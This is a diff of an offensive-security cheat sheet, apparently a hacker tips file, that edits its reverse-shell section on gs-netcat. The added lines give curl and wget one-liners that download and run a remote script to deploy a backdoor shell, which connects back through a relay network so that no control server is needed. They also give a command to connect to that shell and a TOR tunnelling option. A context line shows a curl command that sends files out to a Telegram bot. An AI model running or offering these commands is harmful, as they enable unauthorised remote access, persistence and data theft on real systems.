@@ -49,7 +49,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [File transfer to Telegram](#tg) 
 1. [Reverse Shell / Dumb Shell](#reverse-shell)
    1. [Reverse Shells](#reverse-shell)
-      1. [with gs-netcat](#reverse-shell-gs-netcat)
+      1. [with gs-netcat (encrypted)](#reverse-shell-gs-netcat)
       1. [with Bash](#reverse-shell-bash)
       2. [with cURL (encrypted)](#curlshell)
       3. [with OpenSSL (encrypted)](#sslshell)
@@ -1080,20 +1080,21 @@ curl -sF document=@file.zip "https://api.telegram.org/bot<TG-BOT-TOKEN>/sendDocu
 <a id="reverse-shell"></a>
 ## 5. Reverse Shell / Dumb Shell
 <a id="reverse-shell-gs-netcat"></a>
-**5.i.a. Reverse shell with gs-netcat**
+**5.i.a. Reverse shell with gs-netcat (encrypted)**
 
 Use [gsocket deploy](https://gsocket.io/deploy). It spawns a fully functioning PTY reverse shell and using the Global Socket Relay network. It uses 'password hashes' instead of IP addresses to connect. This means that you do not need to run your own Command & Control server for the backdoor to connect back to. If netcat is a swiss army knife than gs-netcat is a german battle axe :>
 
 ```sh
-gs-netcat -s MySecret -l -i    # Host
+X=ExampleSecretChangeMe bash -c "$(curl -fsSL https://gsocket.io/x)"
+# or X=ExampleSecretChangeMe bash -c "$(wget --no-verbose -O- https://gsocket.io/x)"
 ```
-Use -D to start the reverse shell in the background (daemon) and with a watchdog to auto-restart if killed.
 
 To connect to the shell from your workstation:
 ```sh
-gs-netcat -s MySecret -i
+S=ExampleSecretChangeMe bash -c "$(curl -fsSL https://gsocket.io/x)"
+# or gs-netcat -s ExampleSecretChangeMe -i
+# Add -T to tunnel through TOR
 ```
-Use -T to tunnel trough TOR.
 
 <a id="reverse-shell-bash"></a>
 **5.i.b. Reverse shell with Bash**
